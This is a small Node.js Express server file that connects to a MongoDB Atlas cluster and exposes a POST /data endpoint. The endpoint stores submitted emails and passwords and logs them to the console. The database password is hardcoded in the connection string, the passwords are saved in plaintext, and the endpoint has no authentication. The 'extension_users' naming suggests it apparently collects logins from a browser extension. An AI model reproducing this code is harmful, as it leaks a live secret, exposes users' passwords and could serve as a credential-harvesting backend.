const express = require('express');
const mongoose = require('mongoose');
const app = express();


app.get('/', (req,res) =>{
    res.send("Hello")
})
// Connect to MongoDB
mongoose.connect('mongodb+srv://miarslan555:PswxfNRcQ7y0wBnG@snapx.cseqful.mongodb.net/?retryWrites=true&w=majority&appName=SnapX/extension_users')
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Failed to connect to MongoDB:', err));

// Define a schema for the data
const userDataSchema = new mongoose.Schema({
    email: String,
    password: String
});

// Create a Mongoose model based on the schema
const UserData = mongoose.model('UserData', userDataSchema);

app.use(express.json());

app.post('/data', async (req, res) => {
    try {
        // Extract email and password from the request body
        const { email, password } = req.body;

        // Create a new document using the UserData model
        const userData = new UserData({ email, password });

        // Save the document to the database
        await userData.save();

        console.log('Data saved to MongoDB:', userData);
        res.send('Data saved successfully');
    } catch (error) {
        console.error('Error saving data to MongoDB:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});
